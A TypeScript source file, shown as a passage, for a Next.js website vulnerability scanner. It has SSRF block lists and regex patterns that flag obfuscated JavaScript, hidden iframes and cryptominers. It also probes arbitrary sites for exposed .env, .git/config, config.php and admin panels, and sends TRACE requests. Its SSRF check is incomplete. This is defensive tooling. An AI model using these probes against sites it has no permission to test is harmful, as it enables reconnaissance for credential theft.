import { type NextRequest, NextResponse } from "next/server";

// ─── SSRF / target validation ───────────────────────────────────────────────

function validateTarget(rawUrl: string): { ok: boolean; error?: string; parsed?: URL } {
  let parsed: URL;
  try {
    parsed = new URL(rawUrl.trim());
  } catch {
    return { ok: false, error: "Invalid URL format. Please include http:// or https://" };
  }

  const { protocol, hostname } = parsed;

  if (protocol !== "http:" && protocol !== "https:") {
    return { ok: false, error: "Only http:// and https:// protocols are allowed" };
  }

  // Block internal / loopback
  const blocked = [
    /^localhost$/i,
    /^127\./,
    /^0\.0\.0\.0$/,
    /^::1$/,
    /^10\./,
    /^172\.(1[6-9]|2\d|3[01])\./,
    /^192\.168\./,
    /^169\.254\./,   // link-local
    /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./,  // CGNAT
    /^fd[0-9a-f]{2}:/i,  // IPv6 ULA
    /^fe80:/i,           // IPv6 link-local
    /^fc00:/i,           // IPv6 unique local
    /\.internal$/i,
    /\.local$/i,
    /\.corp$/i,
    /\.home$/i,
  ];
  for (const pattern of blocked) {
    if (pattern.test(hostname)) {
      return { ok: false, error: "Scanning internal/private/loopback addresses is not allowed (SSRF protection)" };
    }
  }

  // Reject raw IP octets that resolve to private ranges via decimal encoding tricks
  if (/^\d+\.\d+\.\d+\.\d+$/.test(hostname)) {
    const parts = hostname.split(".").map(Number);
    if (parts[0] === 10 || (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) || (parts[0] === 192 && parts[1] === 168)) {
      return { ok: false, error: "Private IP addresses are not permitted" };
    }
  }

  return { ok: true, parsed };
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

function encode(obj: object) {
  return `data: ${JSON.stringify(obj)}\n\n`;
}

type SeverityLevel = "critical" | "high" | "medium" | "low" | "info";

interface Finding {
  id: string;
  title: string;
  description: string;
  severity: SeverityLevel;
  cvss_score: number;
  impact: string;
  likelihood: string;
  remediation: string;
  references: string[];
  detected_at: string;
  evidence: string;
  category: string;
}

function makeFinding(partial: Partial<Finding> & { title: string; description: string; evidence: string }): Finding {
  const severityMap: Record<SeverityLevel, number> = {
    critical: 9.5, high: 7.5, medium: 5.0, low: 2.5, info: 0,
  };
  const sev: SeverityLevel = (partial.severity as SeverityLevel) || "medium";
  return {
    id: `VLN-${Date.now()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
    title: partial.title,
    description: partial.description,
    severity: sev,
    cvss_score: partial.cvss_score ?? severityMap[sev],
    impact: partial.impact || "Potential compromise of user data or system integrity",
    likelihood: partial.likelihood || "Medium",
    remediation: partial.remediation || "Review and apply security best practices",
    references: partial.references || [],
    detected_at: new Date().toISOString(),
    evidence: partial.evidence,
    category: partial.category || "General",
  };
}

// ─── Scanning modules ─────────────────────────────────────────────────────────

interface FetchResult {
  ok: boolean;
  status: number;
  headers: Record<string, string>;
  body: string;
  redirectChain: string[];
  finalUrl: string;
  responseTime: number;
  tlsError?: string;
  fetchError?: string;
}

async function fetchTarget(url: string, timeout = 12000): Promise<FetchResult> {
  const redirectChain: string[] = [];
  const start = Date.now();

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      method: "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SecureNetScanner/1.0; +https://next-gen-cyber.vercel.app/securenet)",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        Connection: "keep-alive",
      },
      redirect: "follow",
      signal: controller.signal,
    });

    clearTimeout(timer);
    const responseTime = Date.now() - start;

    const headers: Record<string, string> = {};
    response.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });

    let body = "";
    try {
      body = await response.text();
      if (body.length > 300_000) body = body.slice(0, 300_000); // cap at 300kb
    } catch { /* ignore body read errors */ }

    // Detect redirect chain from URL changes
    if (response.url && response.url !== url) {
      redirectChain.push(response.url);
    }

    return {
      ok: response.ok,
      status: response.status,
      headers,
      body,
      redirectChain,
      finalUrl: response.url || url,
      responseTime,
    };
  } catch (err: unknown) {
    clearTimeout(timer);
    const message = err instanceof Error ? err.message : String(err);
    return {
      ok: false,
      status: 0,
      headers: {},
      body: "",
      redirectChain,
      finalUrl: url,
      responseTime: Date.now() - start,
      fetchError: message,
    };
  }
}

// ── Module 1: Security Headers Analysis ──────────────────────────────────────

function analyzeHeaders(headers: Record<string, string>, url: string): Finding[] {
  const findings: Finding[] = [];
  const isHttps = url.startsWith("https://");

  const required: Array<{
    header: string;
    name: string;
    severity: SeverityLevel;
    cvss: number;
    remediation: string;
    ref: string;
  }> = [
      {
        header: "content-security-policy",
        name: "Content Security Policy (CSP)",
        severity: "high",
        cvss: 7.3,
        remediation: "Add a strict Content-Security-Policy header. Start with: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'",
        ref: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
      },
      {
        header: "x-frame-options",
        name: "X-Frame-Options",
        severity: "medium",
        cvss: 5.4,
        remediation: "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking attacks",
        ref: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
      },
      {
        header: "x-content-type-options",
        name: "X-Content-Type-Options",
        severity: "medium",
        cvss: 4.3,
        remediation: "Add header: X-Content-Type-Options: nosniff to prevent MIME type sniffing",
        ref: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
      },
      {
        header: "referrer-policy",
        name: "Referrer-Policy",
        severity: "low",
        cvss: 3.1,
        remediation: "Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
        ref: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
      },
      {
        header: "permissions-policy",
        name: "Permissions-Policy",
        severity: "low",
        cvss: 3.1,
        remediation: "Add Permissions-Policy to restrict browser features: Permissions-Policy: camera=(), microphone=(), geolocation=()",
        ref: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
      },
    ];

  for (const req of required) {
    if (!headers[req.header]) {
      findings.push(makeFinding({
        title: `Missing Security Header: ${req.name}`,
        description: `The server response does not include the ${req.name} header, which is a recommended security control. Its absence increases attack surface.`,
        severity: req.severity,
        cvss_score: req.cvss,
        impact: `Elevated risk of ${req.header === "content-security-policy" ? "XSS and injection attacks" : req.header === "x-frame-options" ? "clickjacking" : "MIME-based attacks and information leakage"}`,
        likelihood: "High - trivially detectable by attackers",
        remediation: req.remediation,
        references: [req.ref, "https://owasp.org/www-project-secure-headers/"],
        evidence: `HTTP response headers do not contain: ${req.header}`,
        category: "Security Headers",
      }));
    }
  }

  // HSTS check (only relevant for HTTPS)
  if (isHttps && !headers["strict-transport-security"]) {
    findings.push(makeFinding({
      title: "Missing HTTP Strict-Transport-Security (HSTS)",
      description: "HSTS instructs browsers to only connect via HTTPS. Its absence allows SSL stripping attacks where an attacker can downgrade connections to HTTP.",
      severity: "high",
      cvss_score: 7.4,
      impact: "SSL stripping and man-in-the-middle attacks possible, exposing session tokens and credentials",
      likelihood: "Medium - requires network-level attacker position",
      remediation: "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
      references: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security", "https://hstspreload.org/"],
      evidence: `HTTPS site missing Strict-Transport-Security header. Checked final URL: ${url}`,
      category: "Security Headers",
    }));
  }

  // Server information disclosure
  const serverHeader = headers["server"] || "";
  const xPowered = headers["x-powered-by"] || "";
  if (serverHeader && /(?:apache|nginx|iis|tomcat|jetty|lighttpd|express|openssl)\/[\d.]+/i.test(serverHeader)) {
    findings.push(makeFinding({
      title: "Server Software Version Disclosure",
      description: `The Server header reveals specific software version information: "${serverHeader}". Attackers can use this to find known CVEs for that exact version.`,
      severity: "low",
      cvss_score: 3.7,
      impact: "Enables targeted version-specific exploit selection for attackers",
      likelihood: "High - automatic fingerprinting used in mass scanning",
      remediation: "Configure your web server to suppress or obfuscate the Server header",
      references: ["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server"],
      evidence: `Server: ${serverHeader}`,
      category: "Information Disclosure",
    }));
  }
  if (xPowered) {
    findings.push(makeFinding({
      title: "Technology Stack Disclosure via X-Powered-By",
      description: `The X-Powered-By header reveals backend technology: "${xPowered}". This aids reconnaissance phase of attacks.`,
      severity: "low",
      cvss_score: 3.1,
      impact: "Technology fingerprinting enables targeted framework-specific attacks",
      likelihood: "High",
      remediation: "Remove the X-Powered-By header in your application framework configuration",
      references: ["https://owasp.org/www-project-web-security-testing-guide/"],
      evidence: `X-Powered-By: ${xPowered}`,
      category: "Information Disclosure",
    }));
  }

  // CORS check
  const acao = headers["access-control-allow-origin"] || "";
  if (acao === "*") {
    findings.push(makeFinding({
      title: "CORS Misconfiguration: Wildcard Origin",
      description: "The Access-Control-Allow-Origin header is set to '*' (wildcard), allowing any origin to make cross-origin requests to this resource. When combined with cookies or authentication, this can lead to session theft.",
      severity: "medium",
      cvss_score: 6.5,
      impact: "Cross-site request forgery and unauthorized API access from any malicious domain",
      likelihood: "Medium - requires user interaction",
      remediation: "Restrict CORS origins to explicitly whitelisted domains. Never use '*' with credentialed requests",
      references: ["https://portswigger.net/web-security/cors", "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"],
      evidence: `Access-Control-Allow-Origin: ${acao}`,
      category: "CORS Misconfiguration",
    }));
  }

  return findings;
}

// ── Module 2: Content / JavaScript Analysis ───────────────────────────────────

function analyzeContent(body: string, baseUrl: string): Finding[] {
  const findings: Finding[] = [];
  if (!body) return findings;

  // Obfuscated JavaScript patterns
  const evalCount = (body.match(/\beval\s*\(/g) || []).length;
  if (evalCount >= 3) {
    findings.push(makeFinding({
      title: "Excessive eval() Usage Detected",
      description: `Found ${evalCount} occurrences of eval() in page source. Excessive eval() is a strong indicator of obfuscated/malicious JavaScript that dynamically executes hidden code to evade static analysis.`,
      severity: evalCount >= 8 ? "high" : "medium",
      cvss_score: evalCount >= 8 ? 7.1 : 5.3,
      impact: "Dynamic code execution can load secondary payloads, steal credentials, or perform drive-by-download attacks",
      likelihood: "High - observed multiple eval() calls in page source",
      remediation: "Audit all eval() calls. Legitimate sites rarely need dynamic code evaluation. Implement a strict Content Security Policy to block eval()",
      references: ["https://owasp.org/www-community/attacks/Eval_Injection", "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!"],
      evidence: `Found ${evalCount} eval() calls in HTML source. First occurrence near: ${extractContext(body, "eval(", 100)}`,
      category: "Malicious JavaScript",
    }));
  }

  // atob misuse for payload decoding
  const atobCount = (body.match(/\batob\s*\(/g) || []).length;
  if (atobCount >= 3) {
    findings.push(makeFinding({
      title: "Suspicious Base64 Decoding (atob) Activity",
      description: `Detected ${atobCount} calls to atob() (Base64 decoder) in page JavaScript. This is commonly used by malware to hide encoded payloads from static analysis.`,
      severity: "high",
      cvss_score: 7.5,
      impact: "Encoded payloads may contain exploit code, credential harvesters, or backdoor communication channels",
      likelihood: "High - pattern strongly correlates with malicious payload hiding",
      remediation: "Remove unnecessary atob() calls. Legitimate utility functions should not require runtime Base64 decoding of code",
      references: ["https://www.mandiant.com/resources/blog/evasive-malware", "https://owasp.org/www-community/attacks/Obfuscated_malicious_code"],
      evidence: `${atobCount} calls to atob() detected. Sample: ${extractContext(body, "atob(", 120)}`,
      category: "Malicious JavaScript",
    }));
  }

  // document.write misuse
  const docWriteCount = (body.match(/document\.write\s*\(/g) || []).length;
  if (docWriteCount >= 2) {
    findings.push(makeFinding({
      title: "Suspicious document.write() Usage",
      description: `Found ${docWriteCount} uses of document.write() which can be exploited to inject malicious HTML/JS content, particularly when combined with obfuscated input.`,
      severity: "medium",
      cvss_score: 5.3,
      impact: "Dynamic HTML injection can introduce XSS vulnerabilities and load malicious external resources",
      likelihood: "Medium",
      remediation: "Replace document.write() with safer DOM manipulation methods (createElement, innerHTML with proper sanitization)",
      references: ["https://developer.mozilla.org/en-US/docs/Web/API/Document/write"],
      evidence: `${docWriteCount} document.write() calls found. Context: ${extractContext(body, "document.write(", 100)}`,
      category: "Malicious JavaScript",
    }));
  }

  // Hidden iframes
  const hiddenIframeMatch = body.match(/<iframe[^>]*(?:style\s*=\s*["'][^"']*(?:display\s*:\s*none|width\s*:\s*0|height\s*:\s*0|visibility\s*:\s*hidden)[^"']*["']|width\s*=\s*["']0["']|height\s*=\s*["']0["'])[^>]*>/gi);
  if (hiddenIframeMatch && hiddenIframeMatch.length > 0) {
    findings.push(makeFinding({
      title: "Hidden Iframe Detected",
      description: "One or more hidden iframes were found in the page source. Hidden iframes are a classic malware delivery technique used to silently load exploit pages, drive-by download attacks, or phishing redirectors.",
      severity: "critical",
      cvss_score: 9.1,
      impact: "Silent loading of malicious frames can execute drive-by downloads, credential harvesting, or redirect users to exploit pages without their knowledge",
      likelihood: "Critical - hidden iframes with no legitimate use case have very high correlation with malicious intent",
      remediation: "Remove all hidden iframes. If you did not add these, your site is likely compromised. Perform a full security audit and malware removal",
      references: ["https://owasp.org/www-community/attacks/Clickjacking", "https://www.virustotal.com/"],
      evidence: `Hidden iframe tag found: ${hiddenIframeMatch[0].slice(0, 200)}`,
      category: "Malware Indicator",
    }));
  }

  // Crypto mining patterns
  const cryptoPatterns = [
    /coinhive\.min\.js/i,
    /cryptonight/i,
    /miner\.js/i,
    /CoinHive\s*\.\s*Anonymous/i,
    /wasmEncode.*(?:coinhive|mining)/i,
    /\.startMining/i,
    /new\s+Worker.*mining/i,
  ];
  for (const p of cryptoPatterns) {
    const m = body.match(p);
    if (m) {
      findings.push(makeFinding({
        title: "Cryptojacking Script Detected",
        description: "A known cryptocurrency mining script pattern was found in the page source. Cryptojacking scripts use visitors' CPU resources to mine cryptocurrency without consent.",
        severity: "critical",
        cvss_score: 9.3,
        impact: "Unauthorized use of visitor CPU resources, performance degradation, potential device damage from sustained high CPU usage",
        likelihood: "Critical - matched known cryptojacking pattern",
        remediation: "Immediately remove the mining script. If this is unexpected, your site has been compromised. Change all access credentials and perform a full audit",
        references: ["https://www.malwarebytes.com/cryptojacking", "https://blog.malwarebytes.com/threat-analysis/2017/09/why-is-malwarebytes-blocking-coinhive/"],
        evidence: `Matched pattern: ${p.toString()}. Context: ${extractContext(body, m[0], 100)}`,
        category: "Cryptojacking",
      }));
      break;
    }
  }

  // Suspicious redirect chains in JS
  const suspiciousRedirects = (body.match(/window\.location(?:\.href|\.replace)\s*=\s*["'`][^"'`]{20,}["'`]/g) || []);
  if (suspiciousRedirects.length >= 3) {
    findings.push(makeFinding({
      title: "Suspicious JavaScript Redirect Chain",
      description: `Found ${suspiciousRedirects.length} JavaScript-based location redirects. Multiple redirect chains are often used in phishing kits and malvertising to obfuscate the final malicious destination.`,
      severity: "medium",
      cvss_score: 5.8,
      impact: "Users may be redirected to phishing pages, exploit kits, or malware download sites",
      likelihood: "Medium",
      remediation: "Audit all JavaScript redirects. Ensure they lead to expected, safe destinations",
      references: ["https://owasp.org/www-community/attacks/Open_redirect"],
      evidence: `Sample redirect: ${suspiciousRedirects[0]?.slice(0, 200)}`,
      category: "Malicious JavaScript",
    }));
  }

  // External script sources from suspicious domains
  const scriptSrcs = [...body.matchAll(/<script[^>]*\bsrc\s*=\s*["']([^"']+)["']/gi)].map(m => m[1]);
  const suspiciousTLDs = /\.(?:xyz|tk|cf|ga|ml|click|download|loan|work|racing|top|club|science|review)(?:\/|$)/i;
  for (const src of scriptSrcs) {
    if (/^https?:\/\//i.test(src)) {
      try {
        const srcUrl = new URL(src);
        // External domain that doesn't match the base URL host
        const baseHost = new URL(baseUrl).hostname.replace(/^www\./, "");
        const srcHost = srcUrl.hostname.replace(/^www\./, "");
        if (!srcHost.endsWith(baseHost) && suspiciousTLDs.test(src)) {
          findings.push(makeFinding({
            title: "Suspicious External Script Source",
            description: `A JavaScript file is loaded from an external domain with a suspicious TLD: ${srcHost}. These TLDs are frequently abused for malicious scripting.`,
            severity: "high",
            cvss_score: 7.2,
            impact: "External scripts have full access to page DOM, cookies, and user input - arbitrary code execution on user devices",
            likelihood: "High - suspicious TLD is a strong indicator",
            remediation: "Replace with a locally hosted version. Implement Subresource Integrity (SRI) checks for any remaining external scripts",
            references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity"],
            evidence: `External script loaded from: ${src.slice(0, 200)}`,
            category: "Malicious JavaScript",
          }));
        }
      } catch { /* ignore invalid script src URLs */ }
    }
  }

  // Check for .env / .git exposure in page text (unusual but happens)
  if (/<title>[^<]*(?:403|404|500|error)[^<]*<\/title>/i.test(body) && body.includes("stack trace")) {
    findings.push(makeFinding({
      title: "Stack Trace / Debug Information Exposed",
      description: "The page appears to expose a server-side stack trace or debug information. This reveals internal application structure, file paths, and potentially sensitive configuration.",
      severity: "high",
      cvss_score: 7.5,
      impact: "Detailed technical information enables targeted exploitation of specific vulnerabilities",
      likelihood: "High - stack traces are directly visible to any visitor",
      remediation: "Disable debug mode in production. Implement proper error handling that returns generic error pages",
      references: ["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/"],
      evidence: "Page contains stack trace indicators in HTML title and body content",
      category: "Information Disclosure",
    }));
  }

  return findings;
}

function extractContext(body: string, term: string, radius: number): string {
  const idx = body.indexOf(term);
  if (idx === -1) return "";
  const start = Math.max(0, idx - 20);
  const end = Math.min(body.length, idx + term.length + radius);
  return "..." + body.slice(start, end).replace(/[\r\n]+/g, " ").trim() + "...";
}

// ── Module 3: Sensitive Path Probing ──────────────────────────────────────────

async function probeSensitivePaths(baseUrl: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const base = baseUrl.replace(/\/$/, "");

  const probes: Array<{ path: string; name: string; severity: SeverityLevel; cvss: number; description: string }> = [
    { path: "/.env", name: ".env File Exposure", severity: "critical", cvss: 9.8, description: "Environment configuration file exposed, likely containing database credentials, API keys, and secret tokens" },
    { path: "/.git/config", name: "Git Repository Exposure", severity: "critical", cvss: 9.1, description: "Git repository configuration exposed, enabling source code extraction and credentials retrieval" },
    { path: "/admin", name: "Admin Panel Publicly Accessible", severity: "high", cvss: 8.2, description: "Administrative interface is publicly accessible without access controls at the network layer" },
    { path: "/wp-admin/", name: "WordPress Admin Panel Exposed", severity: "high", cvss: 7.5, description: "WordPress admin dashboard accessible to unauthenticated users - attackers can attempt brute-force attacks" },
    { path: "/phpmyadmin/", name: "phpMyAdmin Interface Exposed", severity: "critical", cvss: 9.4, description: "Database administration interface publicly accessible, enabling direct database attacks" },
    { path: "/backup/", name: "Backup Directory Exposed", severity: "high", cvss: 8.0, description: "Backup directory accessible which may contain sensitive data, database dumps, or configuration files" },
    { path: "/config.php", name: "Configuration File Exposed", severity: "critical", cvss: 9.5, description: "PHP configuration file directly accessible, potentially revealing credentials and application secrets" },
    { path: "/web.config", name: "IIS Web.config Exposed", severity: "critical", cvss: 9.5, description: "IIS configuration file accessible, revealing connection strings, API keys, and server configuration" },
    { path: "/server-status", name: "Apache Server Status Page", severity: "medium", cvss: 5.8, description: "Apache server-status page exposes current request activity, connected IPs, and server statistics" },
    { path: "/robots.txt", name: "Robots.txt Analysis", severity: "info", cvss: 0, description: "Reviewing robots.txt for disallowed paths that reveal sensitive areas" },
  ];

  // Run probes with limited concurrency
  const chunkSize = 3;
  for (let i = 0; i < probes.length; i += chunkSize) {
    const chunk = probes.slice(i, i + chunkSize);
    const results = await Promise.allSettled(
      chunk.map(async (probe) => {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);
        try {
          const res = await fetch(`${base}${probe.path}`, {
            method: "GET",
            headers: { "User-Agent": "Mozilla/5.0 (compatible; SecureNetScanner/1.0)" },
            redirect: "manual",
            signal: controller.signal,
          });
          clearTimeout(timeout);
          return { probe, status: res.status, ok: res.ok };
        } catch {
          clearTimeout(timeout);
          return { probe, status: 0, ok: false };
        }
      })
    );

    for (const result of results) {
      if (result.status === "fulfilled") {
        const { probe, status, ok } = result.value;

        if (probe.path === "/robots.txt" && ok) {
          // Analyze robots.txt for sensitive path disclosures
          try {
            const r = await fetch(`${base}/robots.txt`, { headers: { "User-Agent": "SecureNetScanner/1.0" } });
            const text = await r.text();
            const disallowedPaths = (text.match(/Disallow:\s*(.+)/g) || []).map(l => l.replace("Disallow:", "").trim());
            const sensitiveLooking = disallowedPaths.filter(p => /admin|backup|config|secret|private|api|key|token|db|database/i.test(p));
            if (sensitiveLooking.length > 0) {
              findings.push(makeFinding({
                title: "Sensitive Paths Disclosed in robots.txt",
                description: "The robots.txt file reveals paths intended to be hidden from indexing. Attackers specifically look for 'Disallow' entries to find unprotected sensitive areas.",
                severity: "medium",
                cvss_score: 5.3,
                impact: "Enumeration of sensitive application endpoints",
                likelihood: "High - robots.txt is widely scanned by attackers",
                remediation: "Do not rely on robots.txt for security. Implement proper authentication on all sensitive paths",
                references: ["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage"],
                evidence: `Sensitive paths in robots.txt: ${sensitiveLooking.join(", ")}`,
                category: "Information Disclosure",
              }));
            }
          } catch { /* ignore */ }
          continue;
        }

        // 200 OK on sensitive paths = vulnerability
        if (ok && probe.severity !== "info") {
          findings.push(makeFinding({
            title: probe.name,
            description: probe.description,
            severity: probe.severity,
            cvss_score: probe.cvss,
            impact: "Sensitive resource is publicly readable without authentication",
            likelihood: "Critical - resource returns HTTP 200",
            remediation: `Immediately restrict access to ${probe.path}. Set proper file permissions, move sensitive files outside web root, or add authentication middleware`,
            references: ["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"],
            evidence: `GET ${base}${probe.path} returned HTTP ${status} (accessible without authentication)`,
            category: "Exposed Sensitive Files",
          }));
        }

        // 403 on admin paths might indicate the path exists but is protected (info)
        if (status === 403 && ["/admin", "/wp-admin/", "/phpmyadmin/"].includes(probe.path)) {
          findings.push(makeFinding({
            title: `${probe.name} Exists (Access Restricted)`,
            description: `The path ${probe.path} exists but returns HTTP 403 (Forbidden). While currently protected, its existence confirms an attack surface for brute-force and bypass attempts.`,
            severity: "low",
            cvss_score: 2.6,
            impact: "Confirms admin panel location, enabling targeted brute-force attacks",
            likelihood: "Medium",
            remediation: "Move admin interfaces to non-standard paths, add IP allowlisting, or use multi-factor authentication",
            references: ["https://owasp.org/www-project-top-ten/"],
            evidence: `GET ${base}${probe.path} returned HTTP 403 (path exists, access denied)`,
            category: "Attack Surface",
          }));
        }
      }
    }
  }

  return findings;
}

// ── Module 4: SSL / TLS Analysis ─────────────────────────────────────────────

async function analyzeSSL(url: string, headers: Record<string, string>): Promise<Finding[]> {
  const findings: Finding[] = [];
  const parsed = new URL(url);

  if (parsed.protocol !== "https:") {
    findings.push(makeFinding({
      title: "Site Not Using HTTPS",
      description: "The target website does not use HTTPS encryption. All data transmitted between users and this server is sent in plaintext and can be intercepted by any network observer.",
      severity: "critical",
      cvss_score: 9.2,
      impact: "Complete exposure of all user data including passwords, sessions, and personal information to network interception",
      likelihood: "High - any network-level attacker can passively capture all traffic",
      remediation: "Obtain and install a valid TLS certificate (free options: Let's Encrypt). Enable HTTPS on all endpoints and redirect HTTP to HTTPS",
      references: ["https://letsencrypt.org/", "https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security"],
      evidence: `Requested URL uses HTTP protocol: ${url}`,
      category: "SSL/TLS",
    }));
    return findings;
  }

  // Check for mixed content indicators in headers
  const csp = headers["content-security-policy"] || "";
  if (csp.includes("http://") && !csp.includes("https://")) {
    findings.push(makeFinding({
      title: "Potential Mixed Content in CSP Policy",
      description: "The Content Security Policy references HTTP sources, which could permit mixed content loading. Mixed content undermines HTTPS security.",
      severity: "medium",
      cvss_score: 5.4,
      impact: "HTTP resources loaded on HTTPS pages can be intercepted and modified by attackers",
      likelihood: "Medium",
      remediation: "Update CSP to only allow HTTPS sources. Use 'upgrade-insecure-requests' directive",
      references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content"],
      evidence: `CSP header contains HTTP references: ${csp.slice(0, 200)}`,
      category: "SSL/TLS",
    }));
  }

  // Look for HSTS header quality
  const hsts = headers["strict-transport-security"] || "";
  if (hsts) {
    const maxAgeMatch = hsts.match(/max-age=(\d+)/i);
    const maxAge = maxAgeMatch ? parseInt(maxAgeMatch[1]) : 0;
    if (maxAge < 15_552_000) { // Less than 6 months
      findings.push(makeFinding({
        title: "Weak HSTS max-age Duration",
        description: `HSTS max-age is set to only ${maxAge} seconds (${Math.round(maxAge / 86400)} days). OWASP recommends at least 15,552,000 seconds (6 months). Short HSTS durations reduce protection windows.`,
        severity: "low",
        cvss_score: 3.1,
        impact: "Shorter HSTS window means users are unprotected from SSL stripping if they haven't visited before",
        likelihood: "Low",
        remediation: "Set HSTS max-age to at least 31,536,000 (1 year). Add includeSubDomains and preload directives",
        references: ["https://hstspreload.org/"],
        evidence: `Strict-Transport-Security: ${hsts}`,
        category: "SSL/TLS",
      }));
    }
    if (!hsts.includes("includeSubDomains")) {
      findings.push(makeFinding({
        title: "HSTS Missing includeSubDomains Directive",
        description: "The HSTS policy does not include the 'includeSubDomains' directive. Subdomains remain vulnerable to SSL stripping attacks even when the main domain is protected.",
        severity: "low",
        cvss_score: 3.4,
        impact: "Subdomains can be targeted with SSL stripping attacks",
        likelihood: "Low",
        remediation: "Add 'includeSubDomains' to HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains",
        references: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"],
        evidence: `Strict-Transport-Security: ${hsts}\n(Missing includeSubDomains)`,
        category: "SSL/TLS",
      }));
    }
  }

  return findings;
}

// ── Module 5: HTTP method & misc checks ──────────────────────────────────────

async function analyzeMisc(baseUrl: string, result: FetchResult): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Check for TRACE method
  try {
    const controller = new AbortController();
    const traceTimer = setTimeout(() => controller.abort(), 6000);
    const traceRes = await fetch(baseUrl, {
      method: "TRACE",
      headers: { "User-Agent": "SecureNetScanner/1.0" },
      signal: controller.signal,
    });
    clearTimeout(traceTimer);
    if (traceRes.status === 200) {
      findings.push(makeFinding({
        title: "HTTP TRACE Method Enabled",
        description: "The server responds to HTTP TRACE requests. TRACE can be abused in Cross-Site Tracing (XST) attacks to steal cookies even when HttpOnly flag is set.",
        severity: "medium",
        cvss_score: 5.8,
        impact: "TRACE requests echo back HTTP headers including cookies, enabling Cross-Site Tracing attacks",
        likelihood: "Medium",
        remediation: "Disable HTTP TRACE method on your web server configuration. In Apache: TraceEnable Off. In Nginx: add 'if ($request_method = TRACE) { return 405; }'",
        references: ["https://owasp.org/www-community/attacks/Cross_Site_Tracing", "https://portswigger.net/kb/issues/00500a00_http-trace-method-is-enabled"],
        evidence: `HTTP TRACE request to ${baseUrl} returned HTTP 200`,
        category: "HTTP Misconfiguration",
      }));
    }
  } catch { /* ignore */ }

  // Clickjacking via frame-ancestors check
  const csp = result.headers["content-security-policy"] || "";
  const xfo = result.headers["x-frame-options"] || "";
  if (!xfo && !csp.includes("frame-ancestors")) {
    findings.push(makeFinding({
      title: "Clickjacking Vulnerability: No Frame Restrictions",
      description: "Neither X-Frame-Options nor CSP frame-ancestors directive is present. The page can be embedded in an iframe on any malicious website, enabling clickjacking attacks where users are tricked into performing actions.",
      severity: "medium",
      cvss_score: 6.1,
      impact: "Users can be tricked into clicking hidden UI elements, potentially authorizing malicious actions or making purchases",
      likelihood: "Medium - requires social engineering but is highly effective",
      remediation: "Add X-Frame-Options: DENY header or CSP frame-ancestors 'none' directive to prevent iframe embedding",
      references: ["https://owasp.org/www-community/attacks/Clickjacking", "https://portswigger.net/web-security/clickjacking"],
      evidence: `Response missing both X-Frame-Options header and CSP frame-ancestors directive. Checked URL: ${baseUrl}`,
      category: "Clickjacking",
    }));
  }

  // Slow response detection
  if (result.responseTime > 5000) {
    findings.push(makeFinding({
      title: "High Server Response Latency",
      description: `The server took ${result.responseTime}ms to respond. Excessive latency may indicate resource exhaustion, an active DDoS attack, or extremely unoptimized server configuration.`,
      severity: "low",
      cvss_score: 2.3,
      impact: "Availability issues and potential DoS vulnerability",
      likelihood: "High - observed during this scan",
      remediation: "Optimize server performance, implement caching (CDN), and set appropriate rate limits",
      references: [],
      evidence: `Server response time: ${result.responseTime}ms (acceptable threshold: <3000ms)`,
      category: "Performance & Availability",
    }));
  }

  // Redirect chain detection
  if (result.redirectChain.length >= 3) {
    findings.push(makeFinding({
      title: "Long Redirect Chain Detected",
      description: `The page involves ${result.redirectChain.length} redirects before reaching the final destination. Long redirect chains can mask malicious destinations and are an indicator of phishing kits or malvertising.`,
      severity: "medium",
      cvss_score: 5.0,
      impact: "Obfuscated redirect chains can route users through tracking, phishing, or malware delivery intermediaries",
      likelihood: "Medium",
      remediation: "Simplify redirect chains. Ensure each redirect is intentional and leads to a trusted destination",
      references: ["https://owasp.org/www-community/attacks/Open_redirect"],
      evidence: `Redirect chain: ${result.redirectChain.join(" → ").slice(0, 300)}`,
      category: "Suspicious Behavior",
    }));
  }

  // Error page detection
  if (result.status >= 500) {
    findings.push(makeFinding({
      title: "Server Error Response Detected",
      description: `The server returned HTTP ${result.status}, indicating a server-side error. This may reveal application instability or misconfiguration.`,
      severity: "medium",
      cvss_score: 4.3,
      impact: "Server errors can cascade into security misconfigurations and expose error details",
      likelihood: "High - observed during scan",
      remediation: "Fix underlying server errors. Ensure generic error pages are shown to users with no technical details",
